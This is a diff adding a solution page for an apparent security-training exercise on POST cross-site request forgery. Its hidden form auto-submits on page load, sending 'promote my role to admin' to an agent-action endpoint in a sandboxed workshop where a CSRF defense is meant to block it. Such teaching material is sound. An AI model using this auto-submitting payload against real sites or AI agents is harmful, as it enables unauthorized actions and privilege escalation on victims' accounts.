@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>POST CSRF — form BLOCKED by defense — solution</title></head>
+<body style="font:14px system-ui;padding:1.5rem;max-width:680px">
+  <h3>POST CSRF — form BLOCKED by defense — solution</h3>
+  <div style="background:#dcfce7;border:2px solid #22c55e;border-radius:8px;padding:.9rem 1rem;margin:.6rem 0 1rem">
+    <b>✓ WORKING PAYLOAD — fires on page load.</b><br>
+    This is the complete payload. Use <b>Execute observed payload</b> in the workshop
+    to run it with the isolated synthetic victim cookie. Exported .invalid targets are only reachable in that managed browser.
+  </div>
+  <p>A hidden <code>&lt;form&gt;</code> auto-submits on page load; the managed browser sends the POST with an eligible synthetic victim cookie across same-site origins.</p>
+  <form id="csrf" action="{{BASE_URL}}/api/workshop/csrf/agent-action" method="POST" style="display:none">
+    <input type="hidden" name="tab" value="post">
+    <input type="hidden" name="message" value="promote my role to admin">
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+  <p style="color:#64748b;margin-top:1.2rem">Make sure you have <b>enabled CSRF protection</b> in this tab (Agent Chat → "turn on CSRF protection") <i>before</i> executing this payload.</p>
+</body>
+</html>
